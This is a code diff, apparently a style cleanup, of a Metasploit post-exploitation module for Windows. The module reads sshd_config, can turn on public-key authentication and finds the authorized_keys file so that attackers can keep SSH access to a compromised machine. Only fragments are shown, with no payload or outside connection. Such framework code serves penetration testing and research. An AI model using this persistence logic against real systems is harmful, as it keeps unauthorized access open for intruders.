@@ -21,12 +21,19 @@ class MetasploitModule < Msf::Post
           remote login via SSH at any time.
         },
         'License' => MSF_LICENSE,
-        'Author' =>
-          [
-            'Dean Welch <dean_welch[at]rapid7.com>'
-          ],
+        'Author' => [
+          'Dean Welch <dean_welch[at]rapid7.com>'
+        ],
         'Platform' => [ 'windows' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_mkdir
+              stdapi_fs_separator
+            ]
+          }
+        }
       )
     )
 
@@ -44,14 +51,13 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-
     sep = separator
 
     sshd_config = read_file(datastore['SSHD_CONFIG'])
 
     print_status('Checking SSH Permissions')
-    unless pub_key_auth_allowed?(sshd_config)
-      enable_pub_key_auth(sshd_config) if datastore['EDIT_CONFIG']
+    if !pub_key_auth_allowed?(sshd_config) && datastore['EDIT_CONFIG']
+      enable_pub_key_auth(sshd_config)
     end
 
     auth_key_file = auth_key_file_name(sshd_config)
@@ -101,7 +107,7 @@ class MetasploitModule < Msf::Post
   end
 
   def pub_key_auth_allowed?(sshd_config)
-    /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
+    /^PubkeyAuthentication\s+(?<pub_key>yes|no)/ =~ sshd_config
     if pub_key && pub_key == 'no'
       print_error('Pubkey Authentication disabled')
     elsif pub_key
@@ -110,12 +116,12 @@ class MetasploitModule < Msf::Post
   end
 
   def auth_key_file_name(sshd_config)
-    %r{^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%/\.]+)} =~ sshd_config
+    %r{^AuthorizedKeysFile\s+(?<auth_key_file>[\w%/.]+)} =~ sshd_config
     if auth_key_file
       auth_key_file = auth_key_file.gsub('%h', '')
       auth_key_file = auth_key_file.gsub('%%', '%')
       if auth_key_file.start_with? '/'
-        auth_key_file = auth_key_file[1..-1]
+        auth_key_file = auth_key_file[1..]
       end
     else
       auth_key_file = '.ssh/authorized_keys'
